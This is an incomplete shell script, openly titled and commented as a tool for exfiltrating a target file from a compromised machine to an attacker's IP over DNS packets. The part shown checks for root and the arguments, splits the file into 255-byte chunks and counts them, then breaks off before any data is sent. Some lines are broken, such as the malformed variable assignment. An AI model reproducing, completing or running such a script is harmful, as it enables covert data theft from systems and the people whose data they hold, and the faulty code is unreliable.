#!/bin/sh

# exfiltration.sh

# Exfiltration of data from the target machine where it is executed to the attacker machine with dns packets

# Usage: ./exfiltration.sh <attacker_ip> <target_file>

# Check if the script is run as root
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# Check if the number of arguments is correct
if [ "$#" -ne 2 ]; then
    echo "Usage: ./exfiltration.sh <attacker_ip> <target_file>"
    exit
fi

# Check if the target file exists
if [ ! -f "$2" ]; then
    echo "File not found!"
    exit
fi

# Check if the target file is readable
if [ ! -r "$2" ]; then
    echo "File not readable!"
    exit
fi

false_dns_ip = $1

# Get the file size
file_size=$(stat -c%s "$2")

# Get the file name
file_name=$(basename "$2")

# Get the file extension
file_extension="${file_name##*.}"


# Split the file into chunks of 255 bytes
split -b 255 "$2" "$2"_chunk

# Get the number of chunks
number_of_chunks=$(ls -l "$2"_chunk* | wc -l)

# Send the number of chunks to the attacker machine



